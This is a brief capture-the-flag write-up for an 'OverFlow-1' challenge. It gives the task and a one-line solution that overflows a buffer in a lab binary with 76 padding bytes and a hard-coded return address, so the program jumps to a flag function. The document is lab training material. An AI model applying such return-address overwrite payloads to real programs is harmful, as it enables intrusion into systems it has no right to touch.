# OverFlow-1  

## Summary

You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this program? You can find it in /problems/overflow-1_0_48b13c56d349b367a4d45d7d1aa31780 on the shell server. Source.

## Solution

cd /problems/overflow-1_0_48b13c56d349b367a4d45d7d1aa31780; python2 -c 'print "A"*76 + "\xe6\x85\x04\x08"' | ./vuln

